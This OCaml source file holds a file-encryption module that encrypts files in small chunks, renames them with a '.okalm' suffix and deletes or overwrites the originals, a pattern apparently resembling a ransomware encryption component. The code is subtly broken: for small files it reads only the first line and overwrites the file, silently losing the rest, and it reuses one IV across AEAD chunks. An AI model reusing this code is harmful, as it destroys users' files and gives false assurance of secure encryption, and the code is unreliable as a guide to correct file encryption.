let step = 70
let max_size = Int64.of_int step

(** [write file content] overwrite [content] in [file] *)
let write filename content =
  let module O = Out_channel in
  O.with_open_text filename (fun oc -> output_string oc content)

(** [read file] returns the [content] in [file] *)
let read filename =
  let module I = In_channel in
  I.with_open_text filename input_line

(** [post_filename file] rename [file] to [file.okalm] if encryption, remove "okalm" otherwise *)
let post_filename file =
  let module F = Filename in
  if F.check_suffix file "okalm" then
    (F.chop_suffix file ".okalm", Cryptokit.AEAD.Decrypt)
  else (file ^ ".okalm", Cryptokit.AEAD.Encrypt)

let encryptf file key iv =
  let module I = In_channel in
  let module O = Out_channel in
  let nfile, direction = post_filename file in
  let filesize = (Unix.LargeFile.stat file).st_size in
  I.with_open_bin file (fun ic ->
      O.with_open_gen [ Open_creat; Open_append ] 0o644 nfile (fun oc ->
          let encwrite pos_at_ic bufsize_from_ic =
            let buffer = Bytes.create bufsize_from_ic in
            let _ = I.seek ic pos_at_ic in
            let _ = I.input ic buffer 0 bufsize_from_ic in
            let to_write =
              Keys.Crypt.encrypt (Bytes.to_string buffer) key iv direction
            in
            let _ = O.output_string oc to_write in
            Int64.add pos_at_ic (Int64.of_int bufsize_from_ic)
          in
          let rec crypting at_pos =
            if Int64.add at_pos max_size >= filesize then
              let bufsize = Int64.to_int @@ Int64.sub filesize at_pos in
              let _ = encwrite at_pos bufsize in
              Unix.unlink file
            else
              let bufsize = step in
              let npos = encwrite at_pos bufsize in
              crypting npos
          in
          crypting (Int64.of_int 0)))

let crypt file key iv =
  let filesize = (Unix.LargeFile.stat file).st_size in
  if filesize > max_size then encryptf file key iv
  else
    let nfile, direction = post_filename file in
    let content = read file in
    let result = Keys.Crypt.encrypt content key iv direction in
    let _ = write file result in
    Unix.rename file nfile
